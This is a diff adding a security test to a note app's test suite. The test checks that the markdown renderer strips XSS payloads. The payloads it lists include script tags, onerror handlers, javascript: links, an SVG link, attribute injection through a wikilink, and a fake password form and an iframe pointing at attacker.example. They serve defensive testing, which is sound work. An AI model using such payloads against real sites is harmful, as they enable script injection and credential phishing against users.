@@ -429,6 +429,27 @@ await test("keyboard: ⌘/Ctrl+N opens a new note", async () => {
   await key("Escape");
 });
 
+await test("security: note HTML is sanitized", async () => {
+  // Parse the rendered HTML and inspect real elements and attributes, not text.
+  const bad = await js(`import('/src/lib/markdown.ts').then((m) => {
+    const html = [
+      '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '[x](javascript:alert(1))',
+      '<form action="https://attacker.example"><input type=password><button>Sign in</button></form>',
+      '<iframe src="https://attacker.example"></iframe>', '<div style="position:fixed;inset:0">overlay</div>',
+      '<style>body{display:none}</style>', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
+      '[[a" onmouseover="alert(1)]]',
+    ].map((p) => m.render(p, () => true)).join('');
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const found = [...doc.querySelectorAll('script, form, input, button, textarea, select, iframe, style')].map((e) => e.tagName);
+    for (const e of doc.body.querySelectorAll('*'))
+      for (const a of e.attributes)
+        if (/^on|^style$/i.test(a.name) || /^\\s*javascript:/i.test(a.value)) found.push(e.tagName + '[' + a.name + ']');
+    return found;
+  })`);
+  ok(bad.length === 0, `unsafe HTML survived: ${bad.join(", ")}`);
+  ok((await js(`import('/src/lib/markdown.ts').then((m) => m.render('[[Republic]]', () => true))`)).includes('data-note="Republic"'), "wikilinks lost data-note");
+});
+
 for (const [status, name, err] of results) console.log(`${status === "PASS" ? "✔" : "✖"} ${name}${err ? `\n    ${err}` : ""}`);
 const failed = results.filter((r) => r[0] === "FAIL").length;
 console.log(`\n${results.length - failed} passed, ${failed} failed`);
